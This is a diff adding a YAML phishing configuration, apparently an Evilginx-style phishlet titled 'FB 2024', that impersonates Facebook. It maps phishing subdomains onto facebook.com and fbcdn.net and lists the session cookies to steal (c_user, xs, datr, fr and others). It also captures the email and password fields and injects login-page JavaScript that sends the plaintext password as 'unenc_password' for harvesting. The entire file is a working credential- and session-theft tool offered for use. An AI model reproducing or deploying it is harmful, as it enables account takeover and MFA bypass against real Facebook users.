@@ -1,0 +1,105 @@
+name: "FB 2024"
+author: "syrex1013"
+min_ver: "3.0.0"
+redirect_url: "http://en-gb.facebook.com"
+
+proxy_hosts:
+  - {
+      phish_sub: "",
+      orig_sub: "",
+      domain: "facebook.com",
+      session: true,
+      is_landing: false,
+    }
+  - {
+      phish_sub: "www",
+      orig_sub: "www",
+      domain: "facebook.com",
+      session: true,
+      is_landing: true,
+      auto_filter: true,
+    }
+  - {
+      phish_sub: "m",
+      orig_sub: "m",
+      domain: "facebook.com",
+      session: true,
+      is_landing: false,
+      auto_filter: true,
+    }
+  - {
+      phish_sub: "static",
+      orig_sub: "static.xx",
+      domain: "fbcdn.net",
+      session: false,
+      is_landing: false,
+      auto_filter: true,
+    }
+
+auth_tokens:
+  - domain: ".facebook.com"
+    keys: ["c_user", "xs", "sb", "datr", "fr", "wd"]
+    type: "cookie"
+
+auth_urls:
+  - "/ajax/bootloader-endpoint"
+
+credentials:
+  username:
+    key: "email"
+    search: "(.*)"
+    type: "post"
+  password:
+    key: "^unenc_password$"
+    search: "(.*)"
+    type: "post"
+
+login:
+  domain: "www.facebook.com"
+  path: "/login"
+
+js_inject:
+  - trigger_domains: ["www.facebook.com", "m.facebook.com"]
+    trigger_paths: ["/login"]
+    trigger_params: []
+    script: |
+      document.addEventListener("DOMContentLoaded", function() {
+          onclickListener();
+      });
+
+      function onclickListener() {
+          var submit = document.querySelectorAll('button[type=submit]')[0];
+          if (submit) {
+              submit.setAttribute("onclick", "sendPass()");
+          }
+      }
+
+      function sendPass() {
+          var passwordElement = document.getElementsByName("pass")[0];
+          
+          if (!passwordElement) {
+              return;
+          }
+          
+          var password = passwordElement.value;
+          
+          if (!password) {
+              return;
+          }
+
+          var xhr = new XMLHttpRequest();
+          xhr.open("POST", '/login/device-based/regular/login/', true);
+          xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+
+          xhr.onreadystatechange = function() {
+              if (xhr.readyState === XMLHttpRequest.DONE) {
+                  if (xhr.status >= 200 && xhr.status < 300) {
+                      console.log("Password sent successfully");
+                  } else {
+                      console.error("Failed to send password, status: " + xhr.status);
+                  }
+              }
+          };
+
+          xhr.send("unenc_password=" + encodeURIComponent(password));
+      }
